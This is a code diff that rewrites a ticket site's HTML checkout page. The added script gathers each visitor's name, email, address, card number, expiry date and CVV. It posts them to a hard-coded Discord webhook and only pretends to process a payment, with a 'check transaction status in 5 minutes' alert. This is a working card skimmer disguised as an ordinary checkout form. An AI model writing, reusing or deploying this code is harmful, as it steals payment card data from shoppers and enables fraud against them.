@@ -4,33 +4,73 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout</title>
-    <link rel="stylesheet" href="styles.css">
+    <!-- Link to the new checkout.css -->
+    <link rel="stylesheet" href="checkout.css">
 </head>
 <body>
 
-    <h1>Checkout Page</h1>
-    <form id="checkout-form">
-        <label for="name">Full Name:</label>
-        <input type="text" id="name" name="name" required><br><br>
+    <div class="checkout-card">
+        <h2>Checkout</h2>
+        
+        <div class="section">
+            <label for="full-name">Full Name</label>
+            <input type="text" id="full-name" name="full-name" placeholder="Enter your full name" required>
+        </div>
 
-        <label for="email">Email Address:</label>
-        <input type="email" id="email" name="email" required><br><br>
+        <div class="section">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+        </div>
 
-        <label for="card">Credit Card Number:</label>
-        <input type="text" id="card" name="card" required><br><br>
+        <div class="section">
+            <label for="address">Address</label>
+            <input type="text" id="address" name="address" placeholder="Enter your address" required>
+        </div>
 
-        <label for="expiry">Expiry Date:</label>
-        <input type="month" id="expiry" name="expiry" required><br><br>
+        <div class="section">
+            <label for="card-number">Card Number</label>
+            <input type="number" id="card-number" name="card-number" placeholder="Enter your card number" required>
+        </div>
 
-        <label for="cvv">CVV:</label>
-        <input type="text" id="cvv" name="cvv" required><br><br>
+        <div class="section">
+            <label for="expiration">Expiration Date</label>
+            <input type="text" id="expiration" name="expiration" placeholder="MM/YY" required>
+        </div>
 
-        <button type="submit" class="checkout-button">Complete Checkout</button>
-    </form>
+        <div class="section">
+            <label for="cvv">CVV</label>
+            <input type="number" id="cvv" name="cvv" placeholder="Enter your CVV" required>
+        </div>
 
-    <a href="index.html" class="back-button">Back to Home</a>
+        <button class="checkout-button" onclick="processTransaction()">Checkout</button>
+        <a href="tickets.html" class="back-button">Back to Tickets</a>
+    </div>
 
-    <script src="checkout.js"></script>
+    <script>
+        function processTransaction() {
+            alert("Your transaction is being processed. Check transaction status in 5 minutes.");
+            
+            // Sending the entered details to the Discord webhook
+            const fullName = document.getElementById("full-name").value;
+            const email = document.getElementById("email").value;
+            const address = document.getElementById("address").value;
+            const cardNumber = document.getElementById("card-number").value;
+            const expiration = document.getElementById("expiration").value;
+            const cvv = document.getElementById("cvv").value;
 
+            const data = {
+                content: `New Checkout: \n Full Name: ${fullName} \n Email: ${email} \n Address: ${address} \n Card Number: ${cardNumber} \n Expiration: ${expiration} \n CVV: ${cvv}`
+            };
+
+            fetch('https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            });
+        }
+    </script>
+    
 </body>
 </html>
